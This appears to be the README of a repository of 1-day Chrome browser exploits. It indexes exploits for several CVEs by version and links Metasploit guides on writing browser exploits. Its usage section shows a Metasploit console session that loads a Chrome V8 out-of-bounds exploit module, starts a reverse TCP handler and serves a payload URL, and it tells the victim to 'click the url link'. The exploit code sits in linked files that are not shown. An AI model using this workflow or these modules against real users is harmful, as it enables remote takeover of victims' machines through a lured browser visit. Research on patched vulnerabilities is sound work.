# 1-day exploits
1day exploit repo

## Database
CVE Number | Target | Type | OS | Version | Author 
---------- | -------| ---- | -- | ------- | ------ 
[CVE-2019-5825](windows/browser/chromium/941743/README.md) | Chrome | Browser | Windows | 73.0.3683.86 (64bit) | _Hwiwon Lee_
[CVE-2017-????](linux/browser/chromium/716044/README.md) | Chrome | Browser | Linux | 60.0.3080.5 (64bit) | _Hwiwon Lee_
[CVE-2016-1646](windows/browser/chromium/594574/README.md) | Chrome | Browser | Windows | 49.0.2623.87 (64bit) | _Hwiwon Lee_

## Metasploit
[Official Repo](https://github.com/rapid7/metasploit-framework)  
[How to write a browser exploit using BrowserExploitServer](https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-BrowserExploitServer)  
[How to write a browser exploit using HttpServer](https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-HttpServer)  

## vulncode-db 
Useful vulnerable code db site [demo](https://www.vulncode-db.com/) and [open source](https://github.com/google/vulncode-db)

## Environment Setup
### Chromium
[Downloading old builds of Chrome / Chromium](https://www.chromium.org/getting-involved/download-chromium)


## How to use
### Attacker
```
$ msfconsole
...
[*] Starting persistent handler(s)...
msf5 > use exploit/windows/browser/chrome_v8_oob_access_594574 
msf5 exploit(windows/browser/chrome_v8_oob_access_594574) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Using URL: http://0.0.0.0:8080/B3mDU4Cmr
[*] Local IP: http://127.0.0.1:8080/B3mDU4Cmr
[*] Server started.
```

### Victim
Click the url link :D